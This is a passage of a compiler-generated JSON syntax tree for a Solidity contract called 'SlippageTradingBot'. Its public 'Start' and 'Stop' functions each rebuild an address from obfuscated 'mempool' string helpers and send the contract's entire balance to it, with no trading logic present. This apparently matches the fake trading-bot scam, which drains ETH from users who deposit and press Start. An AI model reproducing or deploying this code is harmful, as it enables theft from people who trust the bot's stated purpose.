																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8798:18:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"id": 794,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 773,
																			"src": "8819:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "8798:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 786,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "8791:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 785,
																		"name": "bytes1",
																		"nodeType": "ElementaryTypeName",
																		"src": "8791:6:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 796,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "8791:30:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 777,
															"id": 797,
															"nodeType": "Return",
															"src": "8784:37:0"
														}
													]
												}
											},
											{
												"expression": {
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 830,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "8997:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 831,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "8997:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 832,
												"nodeType": "ExpressionStatement",
												"src": "8997:8:0"
											}
										]
									},
									"id": 834,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nameLocation": "8685:10:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 774,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 773,
												"mutability": "mutable",
												"name": "d",
												"nameLocation": "8702:1:0",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "8696:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 772,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "8696:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "8695:9:0"
									},
									"returnParameters": {
										"id": 777,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 776,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 834,
												"src": "8728:6:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 775,
													"name": "bytes1",
													"nodeType": "ElementaryTypeName",
													"src": "8728:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "8727:8:0"
									},
									"scope": 1189,
									"src": "8676:337:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 858,
										"nodeType": "Block",
										"src": "9215:158:0",
										"statements": [
											{
												"assignments": [
													838
												],
												"declarations": [
													{
														"constant": false,
														"id": 838,
														"mutability": "mutable",
														"name": "to",
														"nameLocation": "9235:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 858,
														"src": "9227:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 837,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9227:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 843,
												"initialValue": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 840,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 771,
																"src": "9256:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 841,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9256:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 839,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 488,
														"src": "9240:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 842,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9240:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9227:43:0"
											},
											{
												"assignments": [
													845
												],
												"declarations": [
													{
														"constant": false,
														"id": 845,
														"mutability": "mutable",
														"name": "contracts",
														"nameLocation": "9297:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 858,
														"src": "9281:25:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 844,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9281:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 850,
												"initialValue": {
													"arguments": [
														{
															"id": 848,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 838,
															"src": "9317:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 847,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "9309:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 846,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "9309:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 849,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9309:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "9281:39:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 854,
																"name": "getLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 930,
																"src": "9350:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 855,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9350:14:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 851,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 845,
															"src": "9331:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 853,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "9341:8:0",
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "9331:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 856,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9331:34:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 857,
												"nodeType": "ExpressionStatement",
												"src": "9331:34:0"
											}
										]
									},
									"functionSelector": "1b55ba3a",
									"id": 859,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Start",
									"nameLocation": "9192:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 835,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "9197:2:0"
									},
									"returnParameters": {
										"id": 836,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "9215:0:0"
									},
									"scope": 1189,
									"src": "9183:190:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 892,
										"nodeType": "Block",
										"src": "9756:268:0",
										"statements": [
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 875,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"expression": {
															"id": 871,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 862,
															"src": "9771:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																"typeString": "struct SlippageTradingBot.slice memory"
															}
														},
														"id": 872,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "9776:4:0",
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 24,
														"src": "9771:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"expression": {
															"id": 873,
															"name": "needle",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 865,
															"src": "9783:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																"typeString": "struct SlippageTradingBot.slice memory"
															}
														},
														"id": 874,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "9790:4:0",
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 24,
														"src": "9783:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "9771:23:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 888,
													"nodeType": "Block",
													"src": "9842:151:0",
													"statements": [
														{
															"expression": {
																"id": 886,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 881,
																	"name": "result",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 869,
																	"src": "9929:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																		"typeString": "struct SlippageTradingBot.slice memory"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"arguments": [
																		{
																			"hexValue": "30",
																			"id": 883,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "9944:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		},
																		{
																			"hexValue": "30",
																			"id": 884,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "9947:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			"value": "0"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			},
																			{
																				"typeIdentifier": "t_rational_0_by_1",
																				"typeString": "int_const 0"
																			}
																		],
																		"id": 882,
																		"name": "slice",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 27,
																		"src": "9938:5:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_struct$_slice_$27_storage_ptr_$",
																			"typeString": "type(struct SlippageTradingBot.slice storage pointer)"
																		}
																	},
																	"id": 885,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "structConstructorCall",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "9938:11:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																		"typeString": "struct SlippageTradingBot.slice memory"
																	}
																},
																"src": "9929:20:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																	"typeString": "struct SlippageTradingBot.slice memory"
																}
															},
															"id": 887,
															"nodeType": "ExpressionStatement",
															"src": "9929:20:0"
														}
													]
												},
												"id": 889,
												"nodeType": "IfStatement",
												"src": "9767:226:0",
												"trueBody": {
													"id": 880,
													"nodeType": "Block",
													"src": "9796:40:0",
													"statements": [
														{
															"expression": {
																"id": 878,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 876,
																	"name": "result",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 869,
																	"src": "9811:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																		"typeString": "struct SlippageTradingBot.slice memory"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"id": 877,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 862,
																	"src": "9820:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																		"typeString": "struct SlippageTradingBot.slice memory"
																	}
																},
																"src": "9811:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
																	"typeString": "struct SlippageTradingBot.slice memory"
																}
															},
															"id": 879,
															"nodeType": "ExpressionStatement",
															"src": "9811:13:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 890,
													"name": "result",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 869,
													"src": "10010:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
														"typeString": "struct SlippageTradingBot.slice memory"
													}
												},
												"functionReturnParameters": 870,
												"id": 891,
												"nodeType": "Return",
												"src": "10003:13:0"
											}
										]
									},
									"id": 893,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nameLocation": "9665:6:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 866,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 862,
												"mutability": "mutable",
												"name": "self",
												"nameLocation": "9685:4:0",
												"nodeType": "VariableDeclaration",
												"scope": 893,
												"src": "9672:17:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
													"typeString": "struct SlippageTradingBot.slice"
												},
												"typeName": {
													"id": 861,
													"nodeType": "UserDefinedTypeName",
													"pathNode": {
														"id": 860,
														"name": "slice",
														"nameLocations": [
															"9672:5:0"
														],
														"nodeType": "IdentifierPath",
														"referencedDeclaration": 27,
														"src": "9672:5:0"
													},
													"referencedDeclaration": 27,
													"src": "9672:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$27_storage_ptr",
														"typeString": "struct SlippageTradingBot.slice"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 865,
												"mutability": "mutable",
												"name": "needle",
												"nameLocation": "9704:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 893,
												"src": "9691:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
													"typeString": "struct SlippageTradingBot.slice"
												},
												"typeName": {
													"id": 864,
													"nodeType": "UserDefinedTypeName",
													"pathNode": {
														"id": 863,
														"name": "slice",
														"nameLocations": [
															"9691:5:0"
														],
														"nodeType": "IdentifierPath",
														"referencedDeclaration": 27,
														"src": "9691:5:0"
													},
													"referencedDeclaration": 27,
													"src": "9691:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$27_storage_ptr",
														"typeString": "struct SlippageTradingBot.slice"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "9671:40:0"
									},
									"returnParameters": {
										"id": 870,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 869,
												"mutability": "mutable",
												"name": "result",
												"nameLocation": "9748:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 893,
												"src": "9735:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$27_memory_ptr",
													"typeString": "struct SlippageTradingBot.slice"
												},
												"typeName": {
													"id": 868,
													"nodeType": "UserDefinedTypeName",
													"pathNode": {
														"id": 867,
														"name": "slice",
														"nameLocations": [
															"9735:5:0"
														],
														"nodeType": "IdentifierPath",
														"referencedDeclaration": 27,
														"src": "9735:5:0"
													},
													"referencedDeclaration": 27,
													"src": "9735:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$27_storage_ptr",
														"typeString": "struct SlippageTradingBot.slice"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "9734:21:0"
									},
									"scope": 1189,
									"src": "9656:368:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 917,
										"nodeType": "Block",
										"src": "10063:158:0",
										"statements": [
											{
												"assignments": [
													897
												],
												"declarations": [
													{
														"constant": false,
														"id": 897,
														"mutability": "mutable",
														"name": "to",
														"nameLocation": "10083:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 917,
														"src": "10075:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														},
														"typeName": {
															"id": 896,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10075:7:0",
															"stateMutability": "nonpayable",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 902,
												"initialValue": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 899,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 771,
																"src": "10104:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 900,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "10104:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 898,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 488,
														"src": "10088:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 901,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10088:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10075:43:0"
											},
											{
												"assignments": [
													904
												],
												"declarations": [
													{
														"constant": false,
														"id": 904,
														"mutability": "mutable",
														"name": "contracts",
														"nameLocation": "10145:9:0",
														"nodeType": "VariableDeclaration",
														"scope": 917,
														"src": "10129:25:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														},
														"typeName": {
															"id": 903,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10129:15:0",
															"stateMutability": "payable",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 909,
												"initialValue": {
													"arguments": [
														{
															"id": 907,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 897,
															"src": "10165:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 906,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "10157:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_address_payable_$",
															"typeString": "type(address payable)"
														},
														"typeName": {
															"id": 905,
															"name": "address",
															"nodeType": "ElementaryTypeName",
															"src": "10157:8:0",
															"stateMutability": "payable",
															"typeDescriptions": {}
														}
													},
													"id": 908,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10157:11:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "10129:39:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 913,
																"name": "getLiquidity",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 930,
																"src": "10198:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																	"typeString": "function () view returns (uint256)"
																}
															},
															"id": 914,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "10198:14:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"id": 910,
															"name": "contracts",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 904,
															"src": "10179:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 912,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "10189:8:0",
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "10179:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 915,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10179:34:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 916,
												"nodeType": "ExpressionStatement",
												"src": "10179:34:0"
											}
										]
									},
									"functionSelector": "bedf0f4a",
									"id": 918,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "Stop",
									"nameLocation": "10041:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 894,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10045:2:0"
									},
									"returnParameters": {
										"id": 895,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10063:0:0"
									},
									"scope": 1189,
									"src": "10032:189:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 929,
										"nodeType": "Block",
										"src": "10281:85:0",
										"statements": [
											{
												"expression": {
													"expression": {
														"arguments": [
															{
																"id": 925,
																"name": "this",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967268,
																"src": "10345:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_SlippageTradingBot_$1189",
																	"typeString": "contract SlippageTradingBot"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_contract$_SlippageTradingBot_$1189",
																	"typeString": "contract SlippageTradingBot"
																}
															],
															"id": 924,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "10337:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_address_$",
																"typeString": "type(address)"
															},
															"typeName": {
																"id": 923,
																"name": "address",
																"nodeType": "ElementaryTypeName",
																"src": "10337:7:0",
																"typeDescriptions": {}
															}
														},
														"id": 926,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"nameLocations": [],
														"names": [],
														"nodeType": "FunctionCall",
														"src": "10337:13:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"id": 927,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"memberLocation": "10351:7:0",
													"memberName": "balance",
													"nodeType": "MemberAccess",
													"src": "10337:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 922,
												"id": 928,
												"nodeType": "Return",
												"src": "10330:28:0"
											}
										]
									},
									"id": 930,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getLiquidity",
									"nameLocation": "10238:12:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 919,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10250:2:0"
									},
									"returnParameters": {
										"id": 922,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 921,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 930,
												"src": "10275:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 920,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "10275:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "10274:6:0"
									},
									"scope": 1189,
									"src": "10229:137:0",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 937,
										"nodeType": "Block",
										"src": "10436:154:0",
										"statements": [
											{
												"expression": {
